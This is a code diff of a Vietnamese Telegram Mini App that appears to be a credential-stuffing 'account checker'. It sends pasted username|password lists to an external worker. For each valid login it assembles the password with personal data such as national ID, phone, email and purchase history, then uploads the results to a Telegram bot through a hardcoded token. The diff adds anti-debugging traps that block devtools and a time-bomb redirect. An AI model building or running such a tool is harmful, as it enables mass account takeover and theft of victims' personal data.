@@ -6,12 +6,23 @@
     <title>Ultima Mini App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
+    
+    <script>
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123) return false; // F12
+            if (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) return false; // I, J, C
+            if (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 83)) return false; // U, S
+        }
+        // Bẫy debugger đơn giản
+        setInterval(function(){debugger;}, 200);
+    </script>
+
     <style>
         :root { --bg: #0a0b10; --primary: #00f2ff; --text: #e0e6ed; --panel: #13151b; --danger: #ff0055; }
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; user-select: none; }
 
-        /* Timer Header */
         .timer-bar {
             background: rgba(255, 0, 85, 0.1); border-bottom: 2px solid var(--danger);
             padding: 10px; text-align: center; font-family: 'Roboto Mono', monospace;
@@ -19,13 +30,11 @@
             animation: pulse-red 2s infinite;
         }
 
-        /* Main Layout */
         .container { flex: 1; padding: 15px; display: flex; flex-direction: column; gap: 15px; overflow: hidden; }
         
-        /* Input Box */
         .input-box {
             background: var(--panel); border: 1px solid #333; border-radius: 10px;
-            display: flex; flex-direction: column; height: 40%; padding: 10px;
+            display: flex; flex-direction: column; height: 35%; padding: 10px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
         textarea {
@@ -33,7 +42,6 @@
             resize: none; font-family: 'Roboto Mono', monospace; font-size: 12px;
         }
         
-        /* Controls */
         .controls { display: flex; gap: 10px; }
         button {
             flex: 1; padding: 12px; border: none; border-radius: 6px;
@@ -47,39 +55,50 @@
             background: #00ff9d; box-shadow: 0 0 10px #00ff9d; margin-top: 10px; width: 100%; display: none;
         }
 
-        /* Result Area */
         .result-box {
             flex: 1; background: var(--panel); border: 1px solid #333; border-radius: 10px;
             padding: 10px; overflow-y: auto; font-family: 'Roboto Mono', monospace; font-size: 11px;
             display: flex; flex-direction: column; gap: 5px;
         }
-        .res-row { padding: 8px; border-radius: 4px; background: #1a1d26; border-left: 3px solid #555; white-space: nowrap; overflow-x: auto; }
+        
+        .res-row { 
+            padding: 10px; border-radius: 4px; background: #1a1d26; 
+            border-left: 3px solid #555; 
+            white-space: nowrap; overflow-x: auto;
+            display: flex; align-items: center; justify-content: space-between; gap: 10px;
+        }
         .res-row.success { border-left-color: #00ff9d; background: rgba(0, 255, 157, 0.05); }
         .res-row.error { border-left-color: var(--danger); color: #ff88a0; }
 
-        /* Scrollbar */
-        ::-webkit-scrollbar { width: 4px; height: 4px; }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
+        .res-text { flex: 1; overflow-x: auto; padding-bottom: 5px; user-select: text; }
+        .res-text::-webkit-scrollbar { height: 2px; }
+        .res-text::-webkit-scrollbar-thumb { background: var(--primary); }
+
+        .copy-btn {
+            background: transparent; border: 1px solid #555; color: #888;
+            padding: 2px 8px; border-radius: 4px; font-size: 10px; cursor: pointer;
+            flex-shrink: 0; width: auto; font-weight: normal;
+        }
 
         @keyframes pulse-red { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="timer-bar" id="countdown">⏳ CHECKING TIME INTEGRITY...</div>
+    <div class="timer-bar" id="countdown">⏳ SYNC TIME...</div>
 
     <div class="container">
         <div class="input-box">
-            <textarea id="inputList" placeholder="Paste user|pass list here..."></textarea>
+            <textarea id="inputList" placeholder="Dán danh sách user|pass vào đây..."></textarea>
             <div class="controls">
-                <button class="btn-check" id="btnCheck" onclick="startCheck()">START</button>
-                <button class="btn-stop" id="btnStop" onclick="stopCheck()">STOP</button>
+                <button class="btn-check" id="btnCheck" onclick="startCheck()">BẮT ĐẦU</button>
+                <button class="btn-stop" id="btnStop" onclick="stopCheck()">DỪNG LẠI</button>
             </div>
             <button class="btn-export" id="btnExport" onclick="sendToBot()">📤 GỬI FILE VỀ BOT</button>
         </div>
 
         <div class="result-box" id="resultContainer">
-            <div style="color: #666; text-align: center; margin-top: 20px;">Waiting for data...</div>
+            <div style="color: #666; text-align: center; margin-top: 20px;">Sẵn sàng...</div>
         </div>
         
         <div style="display: flex; justify-content: space-between; font-size: 12px; font-weight: bold;">
@@ -90,28 +109,25 @@
 
     <script>
         // --- CẤU HÌNH ---
+        // Thay link worker của bạn vào đây
         const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; 
         
-        // 🔴 ĐIỀN TOKEN BOT TELEGRAM CỦA BẠN VÀO ĐÂY ĐỂ GỬI FILE
+        // Token Bot lấy từ file botvip.py bạn gửi
         const BOT_TOKEN = '8404713686:AAF82GVIqgO_esbln3-T0R7NHPxOhwlLhbI'; 
         
-        // 🔴 THỜI GIAN TỰ HỦY (Ngày 9/2/2026 lúc 00:00:00)
-        // Lưu ý: Tháng trong JS bắt đầu từ 0 (Tháng 2 là số 1)
+        // Ngày 9/2/2026 (Tháng 2 là số 1)
         const DEADLINE = new Date(2026, 1, 9, 0, 0, 0).getTime(); 
 
         let isRunning = false;
         let stopSignal = false;
-        let successList = []; // Mảng chứa acc ngon để tải về
+        let successList = []; 
         let stats = { ok: 0, fail: 0 };
         let tgUser = null;
 
-        // 1. Khởi tạo Mini App & Time Bomb
         window.onload = function() {
             const tg = window.Telegram.WebApp;
-            tg.expand(); // Full màn hình
+            tg.expand(); 
             tgUser = tg.initDataUnsafe?.user;
-
-            // Kiểm tra thời gian
             setInterval(checkTimeIntegrity, 1000);
             checkTimeIntegrity();
         };
@@ -119,24 +135,15 @@
         function checkTimeIntegrity() {
             const now = new Date().getTime();
             const distance = DEADLINE - now;
-
             if (distance < 0) {
-                // Hết giờ -> Chuyển hướng ngay lập tức
                 window.location.href = "baotri.html";
                 return;
             }
-
-            // Tính toán hiển thị
             const days = Math.floor(distance / (1000 * 60 * 60 * 24));
             const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-            document.getElementById("countdown").innerText = 
-                `⚠️ AUTO-LOCK IN: ${days}d ${hours}h ${minutes}m ${seconds}s`;
+            document.getElementById("countdown").innerText = `⚠️ SYSTEM EXPIRE IN: ${days}d ${hours}h`;
         }
 
-        // 2. Logic Check
         async function startCheck() {
             const textArea = document.getElementById('inputList');
             let lines = textArea.value.split('\n').filter(line => line.trim() !== "");
@@ -146,10 +153,9 @@
                 return;
             }
 
-            // UI Reset
             isRunning = true;
             stopSignal = false;
-            successList = []; // Reset list thành công
+            successList = [];
             document.getElementById('resultContainer').innerHTML = '';
             document.getElementById('btnCheck').style.display = 'none';
             document.getElementById('btnExport').style.display = 'none';
@@ -160,9 +166,8 @@
                 if (stopSignal) break;
                 const line = lines[i];
 
-                // --- XÓA DÒNG KHỎI INPUT NGAY LẬP TỨC ---
+                // XÓA DÒNG ĐÃ XỬ LÝ
                 const currentVal = textArea.value;
-                // Tạo Regex thay thế dòng hiện tại và ký tự xuống dòng
                 const newVal = currentVal.replace(line + "\n", "").replace(line, "");
                 textArea.value = newVal.trim();
 
@@ -173,27 +178,54 @@
 
                 if (result.status === 'success') {
                     const d = result.data;
-                    // Format gọn cho Mini App
-                    const info = `${d.username}|${d.password} | R:${d.rank} | S:${d.skin}`;
-                    addResult(info, true);
                     
-                    // Lưu vào danh sách tải về (Full data)
-                    const fullLog = `${d.username}|${d.password}|UID:${d.uid}|Rank:${d.rank}|Skin:${d.skin}|Tuong:${d.tuong}|Phone:${d.sdt}`;
-                    successList.push(fullLog);
-                    
+                    // --- DỮ LIỆU FULL 100% ---
+                    const fullInfo = 
+`${d.username}|${d.password}| ` +
+`UID: ${d.uid || "null"} | ` +
+`NAME: ${d.name || "null"} | ` +
+`RANK: ${d.rank || "null"} | ` +
+`LEVEL: ${d.level || "null"} | ` +
+`TƯỚNG: ${d.tuong || "null"} | ` +
+`SKIN: ${d.skin || "null"} | ` +
+`QH: ${d.qh || "null"} | ` +
+`LỊCH SỬ NẠP: ${d.lsnap || "null"} | ` +
+`SÒ: ${d.so || "null"} | ` +
+`CCCD: ${d.cccd || "null"} | ` +
+`EMAIL: ${d.email || "null"} | ` +
+`AUTHEN: ${d.authen || "null"} | ` +
+`SĐT: ${d.sdt || "null"} | ` +
+`FB: ${d.fb || "null"} | ` +
+`BAND: ${d.band || "null"} | ` +
+`NGÀY ĐK: ${d.timeregacc || "null"} | ` +
+`REGION: ${d.acc_country || "null"} | ` +
+`LOGIN GẦN NHẤT: ${d.lslogin || "null"} | ` +
+`ĐỔI MAIL: ${d.change_email || "null"} | ` +
+`ĐỔI SĐT: ${d.change_sdt || "null"} | ` +
+`ĐỔI PASS: ${d.change_password || "null"} | ` +
+`SS: ${d.ss || "null"} | ` +
+`SSS: ${d.sss || "null"} | ` +
+`SKIN HIẾM: ${d.skinlimited || "null"} | ` +
+`MYSTIC: ${d.mystic || "null"} | ` +
+`S-DREAMER: ${d.sdreamer || "null"} | ` +
+`VALENTINE: ${d.valentine || "null"} | ` +
+`OTHER: ${d.other || "null"} | ` +
+`ANIME: ${d.anime || "null"} | ` +
+`AOV: ${d.aov || "null"} | ` +
+`HOẠT ĐỘNG: ${d.tshoatdong || "null"} | ` +
+`TÌNH TRẠNG: ${d.tt || "null"}`;
+
+                    addResult(fullInfo, true);
+                    successList.push(fullInfo); 
                     stats.ok++;
                 } else {
-                    addResult(`${user} -> ${result.msg || 'Fail'}`, false);
+                    addResult(`${user}|${pass} -> ${result.msg || 'Lỗi'}`, false);
                     stats.fail++;
                 }
 
                 document.getElementById('countOk').innerText = stats.ok;
                 document.getElementById('countFail').innerText = stats.fail;
                 
-                // Cuộn xuống dưới cùng
-                const container = document.getElementById('resultContainer');
-                container.scrollTop = container.scrollHeight;
-
                 await new Promise(r => setTimeout(r, 300));
             }
             stopCheck();
@@ -216,7 +248,6 @@
             document.getElementById('btnStop').style.display = 'none';
             document.getElementById('inputList').disabled = false;
             
-            // Nếu có acc ngon thì hiện nút Gửi về Bot
             if (successList.length > 0) {
                 document.getElementById('btnExport').style.display = 'block';
                 window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
@@ -224,50 +255,38 @@
         }
 
         function addResult(text, isSuccess) {
+            const container = document.getElementById('resultContainer');
             const div = document.createElement('div');
             div.className = `res-row ${isSuccess ? 'success' : 'error'}`;
-            div.innerText = text;
-            document.getElementById('resultContainer').appendChild(div);
+            div.innerHTML = `<div class="res-text">${text}</div>`;
+            container.insertBefore(div, container.firstChild);
         }
 
-        // 3. Logic Gửi File Về Bot
         async function sendToBot() {
-            if (!tgUser) {
-                alert("Vui lòng mở bằng Telegram để dùng tính năng này!");
-                return;
-            }
+            if (!tgUser) { alert("Vui lòng mở bằng Telegram!"); return; }
             if (successList.length === 0) return;
 
             const btn = document.getElementById('btnExport');
             btn.innerText = "⏳ ĐANG GỬI...";
             btn.disabled = true;
 
-            // Tạo nội dung file
             const fileContent = successList.join("\n");
             const blob = new Blob([fileContent], { type: "text/plain" });
             const formData = new FormData();
-            
-            // Tên file: success_time.txt
             const fileName = `success_${Date.now()}.txt`;
             
             formData.append("chat_id", tgUser.id);
             formData.append("document", blob, fileName);
-            formData.append("caption", `✅ CHECK HOÀN TẤT!\n👤 User: ${tgUser.first_name}\n📦 Số lượng: ${successList.length} acc.`);
+            formData.append("caption", `✅ CHECK COMPLETED: ${successList.length} ACC LIVE`);
 
             try {
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                     method: 'POST',
                     body: formData
                 });
-                
-                if (res.ok) {
-                    window.Telegram.WebApp.showAlert("✅ Đã gửi file về tin nhắn riêng của bạn!");
-                } else {
-                    alert("❌ Lỗi gửi file. Hãy chắc chắn bạn đã chat với Bot trước đó.");
-                }
-            } catch (e) {
-                alert("❌ Lỗi mạng: " + e.message);
-            }
+                if (res.ok) window.Telegram.WebApp.showAlert("✅ Đã gửi file về Bot!");
+                else alert("❌ Lỗi gửi file.");
+            } catch (e) { alert("❌ Lỗi mạng: " + e.message); }
             
             btn.innerText = "📤 GỬI FILE VỀ BOT";
             btn.disabled = false;
